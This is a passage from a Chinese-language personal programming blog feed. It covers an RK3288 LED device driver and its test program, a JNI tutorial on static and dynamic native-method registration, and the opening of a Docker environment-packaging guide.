*dev;</span><br><span class="line">struct mutex lock;</span><br><span class="line"> </span><br><span class="line">/* about char device */</span><br><span class="line">int major;</span><br><span class="line">int minor;</span><br><span class="line">dev_t ndev;</span><br><span class="line">struct device *mdev;</span><br><span class="line">struct class *cls;</span><br><span class="line">struct cdev *cdev;</span><br><span class="line"> </span><br><span class="line">int red_gpio;</span><br><span class="line">int green_gpio;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">static struct tv_led_dev *g_tv_led;</span><br><span class="line"> </span><br><span class="line">static int tv_led_open(struct inode inode, struct file filp)</span><br><span class="line">&#123;</span><br><span class="line">TV_LED_DEBUG(&quot;tv_led_open.\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static int tv_led_release(struct inode inode, struct file filp)</span><br><span class="line">&#123;</span><br><span class="line">TV_LED_DEBUG(&quot;tv_led_release.\n&quot;);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static ssize_t tv_led_read(struct file filp, char __user buf,</span><br><span class="line">size_t sz, loff_t *off)</span><br><span class="line">&#123;</span><br><span class="line">TV_LED_DEBUG(&quot;tv_led_read.\n&quot;);</span><br><span class="line">return sizeof(int);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">static ssize_t tv_led_write(struct file filp, const char __user buf,</span><br><span class="line">size_t count, loff_t* f_pos)</span><br><span class="line">&#123;</span><br><span class="line">TV_LED_DEBUG(&quot;tv_led_write.\n&quot;);</span><br><span class="line">return sizeof(int);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">下面的代码是一个名为tv_led_ioctl的静态函数，用于处理设备驱动程序中的IO控制操作。</span><br><span class="line">函数接受三个参数：指向struct file的指针filp，无符号整数cmd和无符号长整型data。</span><br><span class="line"></span><br><span class="line">代码首先根据传入的data值判断要设置的状态，如果data为0，则将state设置为GPIO_OUTPUT_LOW，否则将其设置为GPIO_OUTPUT_HIGH。</span><br><span class="line"> </span><br><span class="line">接下来，函数输出调试信息，显示传入的cmd和data的值。</span><br><span class="line"> </span><br><span class="line">然后，代码检查全局指针g_tv_led是否为空，如果为空，输出错误消息并返回g_tv_led的错误指针。</span><br><span class="line"> </span><br><span class="line">接下来，代码使用switch语句根据传入的cmd值执行相应的操作。</span><br><span class="line">在case TV_LED_CMD_R:中，调用gpio_set_value函数设置g_tv_led-&gt;red_gpio引脚的状态为state。</span><br><span class="line">在case TV_LED_CMD_G:中，类似地，调用gpio_set_value函数设置g_tv_led-&gt;green_gpio引脚的状态为state。</span><br><span class="line">在case TV_LED_CMD_B:中注释掉了对g_tv_led-&gt;blue_gpio引脚的设置操作。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">static long tv_led_ioctl(struct file *filp, unsigned int cmd,</span><br><span class="line">                         unsigned long data)</span><br><span class="line">&#123;</span><br><span class="line">int state = (data == 0) ? GPIO_OUTPUT_LOW : GPIO_OUTPUT_HIGH;</span><br><span class="line"> </span><br><span class="line">TV_LED_DEBUG(&quot;tv_led_ioctl. cmd = %d, data = %lu\n&quot;, cmd, data);</span><br><span class="line"> </span><br><span class="line">if (!g_tv_led) &#123;</span><br><span class="line">pr_err(&quot;global pointer g_tv_led is NULL!&quot;);</span><br><span class="line">return PTR_ERR(g_tv_led);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">switch (cmd) &#123;</span><br><span class="line">case TV_LED_CMD_R:</span><br><span class="line">gpio_set_value(g_tv_led-&gt;red_gpio, state);</span><br><span class="line">break;</span><br><span class="line">case TV_LED_CMD_G:</span><br><span class="line">gpio_set_value(g_tv_led-&gt;green_gpio, state);</span><br><span class="line">break;</span><br><span class="line">case TV_LED_CMD_B:</span><br><span class="line">// gpio_set_value(g_tv_led-&gt;blue_gpio, state);</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">这段代码定义了一个名为tv_led_driver_fops的静态变量，其类型是struct file_operations结构体。struct file_operations是Linux内核中用于定义文件操作的结构体之一。</span><br><span class="line"></span><br><span class="line">.owner: 指定模块所有者（即拥有此结构体的模块）。在这里，THIS_MODULE表示当前模块是该结构体的所有者。</span><br><span class="line">.open: 指向打开设备时会被调用的函数 tv_led_open。</span><br><span class="line">.release: 指向释放设备时会被调用的函数 tv_led_release。</span><br><span class="line">.read: 指向读取设备数据时会被调用的函数 tv_led_read。</span><br><span class="line">.write: 指向写入设备数据时会被调用的函数 tv_led_write。</span><br><span class="line">.unlocked_ioctl: 指向处理设备IO控制命令时会被调用的函数 tv_led_ioctl。</span><br><span class="line">.compat_ioctl: 指向处理兼容性设备IO控制命令时会被调用的函数 tv_led_ioctl（用于32位应用程序与64位内核的兼容性）。</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">static struct file_operations tv_led_driver_fops = &#123;</span><br><span class="line">.owner   = THIS_MODULE,</span><br><span class="line">.open    = tv_led_open,</span><br><span class="line">.release = tv_led_release,</span><br><span class="line">.read    = tv_led_read,</span><br><span class="line">.write   = tv_led_write,</span><br><span class="line">.unlocked_ioctl = tv_led_ioctl,</span><br><span class="line">.compat_ioctl   = tv_led_ioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>后面还有一些代码，我就不贴了，但是我将函数和对应的功能简单描述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">tv_led_init_char_dev(struct tv_led_dev *tv_led): 初始化字符设备，包括分配字符设备号、创建字符设备对象、注册字符设备等。</span><br><span class="line"> </span><br><span class="line">tv_led_parse_dt(struct tv_led_dev *tv_led): 解析设备树（Device Tree），获取并配置驱动程序所需的GPIO引脚信息。</span><br><span class="line"></span><br><span class="line">tv_led_probe(struct platform_device *pdev): 在设备被探测到时被调用的函数，用于初始化并注册驱动程序的相关资源和功能。</span><br><span class="line"></span><br><span class="line">tv_led_suspend(struct platform_device *pdev, pm_message_t state): 在系统挂起（suspend）时被调用的函数，用于保存驱动程序的状态。</span><br><span class="line"></span><br><span class="line">tv_led_resume(struct platform_device *pdev): 在系统恢复（resume）时被调用的函数，用于恢复驱动程序的状态。</span><br><span class="line"></span><br><span class="line">tv_led_remove(struct platform_device *pdev): 当设备从系统中移除时被调用的函数，用于释放驱动程序所使用的资源。</span><br><span class="line"></span><br><span class="line">tv_led_of_match[]: 用于匹配设备树中的设备节点，以确定是否加载该驱动程序。</span><br><span class="line"></span><br><span class="line">tv_led_driver: 定义了驱动程序的属性，如名称、设备匹配表、回调函数等。</span><br><span class="line"></span><br><span class="line">tv_led_init(): 模块初始化函数，在驱动程序加载时被调用，注册驱动程序。</span><br><span class="line"></span><br><span class="line">tv_led_exit(): 模块退出函数，在驱动程序卸载时被调用，注销驱动程序。</span><br></pre></td></tr></table></figure><p>其中tv_led_init和tv_led_exit就是模块的出口和入口，入口在模块加载时被调用，在函数中完成模块的初始化工作，例如注册字符设备、申请资源等。出口在模块卸载时被调用，在函数中完成模块的清理工作，例如注销字符设备、释放资源等。</p><p>既然驱动是一个.c文件，那肯定是要编译才能使用的，编译进内核具体操作其实很简单，运行一个 .sh 的shell脚本即可，培训时这个kernel.sh脚本如下，其中的核心其实也就是make编译命令，然后得到两个img镜像文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cd kernel</span><br><span class="line"></span><br><span class="line">make ARCH=arm rk3288-tb.img -j$(grep processor /proc/cpuinfo | awk &#x27;&#123;field=$NF&#125;;END&#123;print field+1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">rm -f RKTools/windows/AndroidTool/rockdev/Image/kernel.img</span><br><span class="line"></span><br><span class="line">rm -f RKTools/windows/AndroidTool/rockdev/Image/resource.img</span><br><span class="line"></span><br><span class="line">mkdir -p RKTools/windows/AndroidTool/rockdev/Image/</span><br><span class="line"></span><br><span class="line">cp -v kernel/kernel.img      RKTools/windows/AndroidTool/rockdev/Image/</span><br><span class="line"></span><br><span class="line">cp -v kernel/resource.img    RKTools/windows/AndroidTool/rockdev/Image/</span><br></pre></td></tr></table></figure><p>得到img镜像后需要通过烧录工具拷进去，烧录工具像下面这样：<br><img src="/upload/2023/08/image-iwba.png"><br>选中678，也就是上面编译出来的两个镜像和一个boot。</p><p>这里在烧录的时候要连接板子，好像是要安装一个驱动才能识别到板子（大概吧，因为我拿到驱动直接就安装了，也不知道不装启动会怎样），驱动安装工具像下面这样：<br><img src="/upload/2023/08/image-lrsm.png"><br>到这里，驱动就通过烧录写进了开发板里面，就可以为上层提供调用设备的接口了。</p><p>这里培训的时候有提到一些指令，但我在实际操作中没怎么用到，还是贴在下面</p><p>加载和卸载模块：</p><p>加载模块：使用insmod命令加载驱动模块，语法为insmod module_name.ko。</p><p>卸载模块：使用rmmod命令卸载驱动模块，语法为rmmod module_name。</p><p>查看模块：lsmod</p><p> </p><h3 id="2-3-测试"><a href="#2-3-测试" class="headerlink" title="2.3 测试"></a>2.3 测试</h3><p>驱动写好了，培训时有一个作业是写一个c程序根据驱动来控制板子上的灯，在驱动的代码中可以看到tv_led_ioctl这个函数已经写好了灯的开关，只需要写一个c程序调用即可，下面是一个示例（别像我一样用sleep控制，这样写被负责人看到说了，睡眠会占用cpu资源）</p><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#define TV_LED_CMD_R  _IOW(&#x27;l&#x27;, 24, unsigned int)</span><br><span class="line">#define TV_LED_CMD_G  _IOW(&#x27;l&#x27;, 25, unsigned int)</span><br><span class="line">#define TV_LED_CMD_B  _IOW(&#x27;l&#x27;, 26, unsigned int)</span><br><span class="line">int main(int argc, char ** argv)</span><br><span class="line">&#123;</span><br><span class="line">    int fd;</span><br><span class="line">    int i;</span><br><span class="line">    fd =  open(&quot;/dev/tv_led&quot;, O_RDWR);</span><br><span class="line">    if(fd &lt; 0) &#123;</span><br><span class="line">        printf(&quot;Failed to open device file\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">&#125;</span><br><span class="line">    // 循环控制 LED 灯</span><br><span class="line">    for(i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">        // 点亮 LED 灯</span><br><span class="line">        ioctl(fd, TV_LED_CMD_G, 1);</span><br><span class="line">        printf(&quot;yellow LED on\n&quot;);</span><br><span class="line">        sleep(1);</span><br><span class="line">        // 熄灭 LED 灯</span><br><span class="line">        ioctl(fd, TV_LED_CMD_G, 0);</span><br><span class="line">        printf(&quot;yellow LED off\n&quot;);</span><br><span class="line">        sleep(1);</span><br><span class="line">        // 点亮 LED 灯</span><br><span class="line">        ioctl(fd, TV_LED_CMD_R, 1);</span><br><span class="line">        printf(&quot;red LED on\n&quot;);</span><br><span class="line">        sleep(1);</span><br><span class="line">        // 熄灭 LED 灯</span><br><span class="line">        ioctl(fd, TV_LED_CMD_R, 0);</span><br><span class="line">        printf(&quot;red LED off\n&quot;);</span><br><span class="line">        sleep(1);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> </p><p>代码写好后需要搭配一个rk文件进行编译，这里涉及到交叉编译，因为本地的系统和开发板的架构是不一样的，一个是x86，一个是arm架构，c编译需要适配arm架构，所以需要使用交叉编译工具链，我们可以在一台机器上使用特定于目标平台的编译器，将源代码转换为适用于目标平台的二进制文件。这样可以方便地开发软件，尤其是嵌入式系统、移动应用程序和跨平台开发。</p><p> </p><p>我直接用的这边负责人的服务器进行的编译，自己服务器上没装sdk，所以具体怎么安装交叉编译工具链我还不太了解，先过了。采用mm指令编译好后得到一个文件，将文件通过adb shell拷进开发板，赋予权限，执行，不出意外就能看到板子上的灯被控制了。这里贴一个mk文件，我目前还不太了解mk文件要咋写，直接用的项目中的。</p><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_SRC_FILES := \</span><br><span class="line"></span><br><span class="line">led.c</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE:= led</span><br><span class="line"></span><br><span class="line">#LOCAL_CFLAGS += -DEXPORT= -DFLOATING_POINT -DUSE_SMALLFT -DVAR_ARRAYS</span><br><span class="line"></span><br><span class="line">#LOCAL_CFLAGS += -O3 -fstrict-aliasing -fprefetch-loop-arrays</span><br><span class="line"></span><br><span class="line">LOCAL_CFLAGS += -Wno-unused-parameter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOCAL_C_INCLUDES += \</span><br><span class="line"></span><br><span class="line">$(LOCAL_PATH)/include</span><br><span class="line"></span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure><p> <br>到此，跟着这篇文章可以做到，自己点亮开发板，对设备树、驱动有了一个初步的认识，这篇文章也是我总结培训的流程写下来的。</p><p> </p><p> </p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNI入门</title>
    <link href="/2023/08/21/JNI%E5%85%A5%E9%97%A8/"/>
    <url>/2023/08/21/JNI%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="JNI介绍"><a href="#JNI介绍" class="headerlink" title="JNI介绍"></a>JNI介绍</h2><p>JNI（Java Native Interface）是Java平台提供的一种编程框架，用于在Java程序中调用和被C、C++等本地编程语言编写的代码。它允许Java程序与本地代码进行交互，实现了Java与其他编程语言的互操作性。</p><p>JNI的主要目的是解决Java程序无法直接访问底层系统资源和本地库的问题。通过使用JNI，开发人员可以通过定义本地方法来扩展Java应用程序的功能，并且能够利用本地语言的性能优势。常见的应用场景包括：</p><p>使用JNI调用本地库：通过JNI，Java程序可以调用由C&#x2F;C++编写的本地库，从而利用底层系统资源和硬件功能，如操作系统API、设备驱动程序等。</p><h2 id="初次使用JNI"><a href="#初次使用JNI" class="headerlink" title="初次使用JNI"></a>初次使用JNI</h2><p>Android studio使用JNI步骤如下：</p><p>1、下载NDK和CMake，在Android设置中</p><p><img src="/upload/2023/08/image-njfd.png"></p><p>2、在项目目录右键，然后选择 “Add C++ to module” 创建同样一个cpp目录，目录下有一个cpp文件 和 CMakeLists.txt</p><p>3、在Java文件中创建native方法，编译器会标红，让编译器处理后会在cpp文件中生成对应的方法。</p><p>MainActivity中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">static &#123;</span><br><span class="line">   System.loadLibrary(&quot;myapplication&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static native void LedOn();</span><br><span class="line"></span><br><span class="line">public static native void LedOff();</span><br><span class="line"></span><br><span class="line">Myapplication.cpp中</span><br><span class="line"></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;android/log.h&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL</span><br><span class="line"></span><br><span class="line">Java_com_example_myapplication_MainActivity_LedOn(JNIEnv *env, jclass clazz) &#123;</span><br><span class="line"></span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, &quot;JNI&quot;, &quot;LedOn&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL</span><br><span class="line"></span><br><span class="line">Java_com_example_myapplication_MainActivity_LedOff(JNIEnv *env, jclass clazz) &#123;</span><br><span class="line"></span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, &quot;JNI&quot;, &quot;LedOff&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时就完成了一个简单的JNI调用，可以通过日志看到Java代码成功调用了C++代码。</p><p>但这个实现中，cpp的方法是采用静态注册，为了提高灵活性，需要采用方法的动态注册。</p><h2 id="静态注册与动态注册"><a href="#静态注册与动态注册" class="headerlink" title="静态注册与动态注册"></a>静态注册与动态注册</h2><p>JNI支持两种方式注册本地方法：静态注册（Static Registration）和动态注册（Dynamic Registration）。这两种注册方式在JNI中都可以用来将Java方法与本地代码进行绑定，但它们的实现方式和使用方法有所不同。</p><h3 id="静态注册（Static-Registration）："><a href="#静态注册（Static-Registration）：" class="headerlink" title="静态注册（Static Registration）："></a>静态注册（Static Registration）：</h3><p>静态注册是在编写本地方法时，将本地方法的声明与本地库的加载绑定在一起的方式。</p><p>在静态注册中，需要手动编写包含本地方法声明的头文件，并在本地代码中实现这些本地方法。</p><p>编译本地代码时，将本地代码与生成的头文件进行链接，生成最终的本地库。</p><p>在Java中，通过System.loadLibrary(“libraryName”)加载本地库，然后直接调用本地方法即可。</p><p>静态注册的优点是简单直接，一次编译即可生成包含本地方法的本地库。缺点是需要手动维护本地方法的声明和头文件，不够灵活。</p><h3 id="动态注册（Dynamic-Registration）："><a href="#动态注册（Dynamic-Registration）：" class="headerlink" title="动态注册（Dynamic Registration）："></a>动态注册（Dynamic Registration）：</h3><p>动态注册是在Java代码中通过JNI提供的函数动态地将Java方法与本地代码进行绑定的方式。</p><p>在动态注册中，不需要手动编写头文件，也不需要在本地代码中实现本地方法。</p><p>在Java中，首先通过System.loadLibrary(“libraryName”)加载本地库。</p><p>然后，在Java代码中使用JNI提供的函数接口，如JNIEnv和JNINativeMethod，通过调用JNI函数来动态注册本地方法。</p><p>动态注册通过调用JNI函数的方式将Java方法与本地代码进行绑定，不再需要生成头文件和本地库。</p><p>动态注册的优点是更加灵活，可以在运行时动态注册本地方法，无需编写额外的头文件。缺点是相对于静态注册，稍微复杂一些。</p><h3 id="下面将上面的代码改为动态注册感受一下"><a href="#下面将上面的代码改为动态注册感受一下" class="headerlink" title="下面将上面的代码改为动态注册感受一下"></a>下面将上面的代码改为动态注册感受一下</h3><p>ActivityMain.java不用做任何修改，只不过因为cpp的修改native方法在编译器中会重新标红，不需要管，可正常编译。</p><p>myapplication.cpp修改如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;android/log.h&gt;</span><br><span class="line"></span><br><span class="line">static void ledOn(JNIEnv *env, jclass clazz) &#123;</span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, &quot;JNI&quot;, &quot;LedOn&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void ledOff(JNIEnv *env, jclass clazz) &#123;</span><br><span class="line">    __android_log_print(ANDROID_LOG_DEBUG, &quot;JNI&quot;, &quot;ledOff&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static JNINativeMethod method_table[] = &#123;</span><br><span class="line">        &#123; &quot;LedOn&quot;, &quot;()V&quot;, (void *)ledOn &#125;,</span><br><span class="line">        &#123; &quot;LedOff&quot;, &quot;()V&quot;, (void *)ledOff &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">static int registerNativeMethods(JNIEnv* env, const char* className, const JNINativeMethod* gMethods, int numMethods) &#123;</span><br><span class="line"></span><br><span class="line">    jclass clazz = env-&gt;FindClass(className);</span><br><span class="line"></span><br><span class="line">    if (clazz == NULL) &#123;</span><br><span class="line">        return JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (env-&gt;RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123;</span><br><span class="line">        return JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    return JNI_TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM vm, void reserved) &#123;</span><br><span class="line">    JNIEnv *env;</span><br><span class="line">    if (vm-&gt;GetEnv(reinterpret_cast&lt;void**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        return JNI_ERR;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (registerNativeMethods(env, &quot;com/example/myapplication/MainActivity&quot;, method_table, sizeof(method_table) / sizeof(method_table[0])) != JNI_TRUE) &#123;</span><br><span class="line">        return JNI_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    return JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在就改成了动态编译。</p><h4 id="其中JNINativeMethod-是一个结构体数组："><a href="#其中JNINativeMethod-是一个结构体数组：" class="headerlink" title="其中JNINativeMethod 是一个结构体数组："></a>其中JNINativeMethod 是一个结构体数组：</h4><p>JNINativeMethod 结构体用于描述一个本地方法的信息，包括方法名、方法签名和对应的函数指针。上面代码中method_table 数组定义了两个 JNINativeMethod 结构体元素，分别对应两个本地方法：LedOn 和 LedOff。每个 JNINativeMethod 结构体包含三个字段：char* name 表示方法名，char* signature 表示方法的签名（参数类型和返回类型），void* fnPtr 表示指向本地方法实现函数的指针。</p><h4 id="registerNativeMethods-方法："><a href="#registerNativeMethods-方法：" class="headerlink" title="registerNativeMethods 方法："></a>registerNativeMethods 方法：</h4><p>这个方法用于动态注册本地方法到指定的 Java 类中。</p><p>输入参数包括 JNIEnv* env，表示 JNI 环境对象；const char* className，表示要注册本地方法的 Java 类的名称；const JNINativeMethod* gMethods，表示本地方法的信息数组；int numMethods，表示本地方法的数量。</p><p>在方法中，首先通过 env-&gt;FindClass(className) 获取要注册的 Java 类的 jclass 对象。</p><p>然后，通过 env-&gt;RegisterNatives(clazz, gMethods, numMethods) 调用 JNI 函数进行注册，将本地方法注册到该 Java 类中。</p><p>注册成功返回 JNI_TRUE，否则返回 JNI_FALSE。</p><h4 id="JNI-OnLoad-方法："><a href="#JNI-OnLoad-方法：" class="headerlink" title="JNI_OnLoad 方法："></a>JNI_OnLoad 方法：</h4><p>JNI_OnLoad 是一个特殊的 JNI 函数，在加载本地库时由 JVM 自动调用。</p><p>它的定义为 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)，其中 vm 表示 Java 虚拟机实例，reserved 是保留参数。</p><p>在 JNI_OnLoad 方法中，你可以获取到 JNIEnv* 环境对象，通过 vm-&gt;GetEnv(reinterpret_cast&lt;void**&gt;(&amp;env), JNI_VERSION_1_6) 获取 JNIEnv*。</p><p>然后，你可以调用 registerNativeMethods 方法来注册本地方法到对应的 Java 类中。</p><p>如果注册成功，可以返回 JNI_VERSION_1_6，表示支持的 JNI 版本；如果注册失败，可以返回 JNI_ERR。</p><p>总结起来，以上代码的目的是通过 JNI_OnLoad 函数在加载本地库时动态注册 method_table 中定义的本地方法到指定的 Java 类中。registerNativeMethods 方法用于执行动态注册操作。这样，在 Java 代码中就可以调用这些本地方法。</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker打包环境简单教程</title>
    <link href="/2023/08/20/Docker%E6%89%93%E5%8C%85%E7%8E%AF%E5%A2%83%E7%AE%80%E5%8D%95%E6%95%99%E7%A8%8B/"/>
    <url>/2023/08/20/Docker%E6%89%93%E5%8C%85%E7%8E%AF%E5%A2%83%E7%AE%80%E5%8D%95%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>关键词：Docker；环境部署</p><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>这周的主要工作是将用Java写的后端和用Python写的深度学习模型进行联通，在联通成功后需要将环境打包成Docker镜像再次进行测试，确保最终提交出去的镜像能够正常启动。过程中踩了些坑，完成后发现有同事也有将环境打包成Docker镜像的需求，就简单写一下教程，并把自己的踩坑记录一下。</p><h2 id="2、将环境打包成镜像方法"><a href="#2、将环境打包成镜像方法" class="headerlink" title="2、将环境打包成镜像方法"></a>2、将环境打包成镜像方法</h2><h3 id="2-1、利用dockerfile创建镜像"><a href="#2-1、利用dockerfile创建镜像" class="headerlink" title="2.1、利用dockerfile创建镜像"></a>2.1、利用dockerfile创建镜像</h3><p>一般来说创建镜像都是基于一个已有的镜像环境再加内容上去，大多数镜像最底层都是一个debian操作系统，因为比较小巧，只占用100M的空间。当然如果追求极致的小，也可以选择scartch 镜像，debian也是基于scartch的。像我的需求是同时要有Java8的jre环境和Python3.6.15的环境，那我的第一步操作就是找对应版本的镜像。</p><p>我所需要的镜像在docker hub —— <a href="https://hub.docker.com/">https://hub.docker.com/</a> 上就能找到，可以看到8-jre镜像实际上有三层，最底层是debian:11 ，中间一层安装了一些基础的包，最上层就是我需要的jre。每一层的dockerfile文件是可以看到的，下面图中点击view in github就能看到这一层对应的dockerfile文件，docker镜像就是通过执行dockerfile文件生成的。</p><p><img src="/upload/2023/08/image-ahwc.png"></p><p><img src="/upload/2023/08/image-bogs.png"></p><p>像上面的jre8的dockerfile文件中第一行会指明父镜像，后面会有一些执行的指令的环境的配置。</p><p>我最终创建的同时具有Java和python环境的镜像就是先下载这个具有Java环境的镜像，再将Python环境的dockerfile文件拿到，将Java环境作为父镜像执行这个dockerfile就能将python的环境也打包进去。因为发现Java和Python 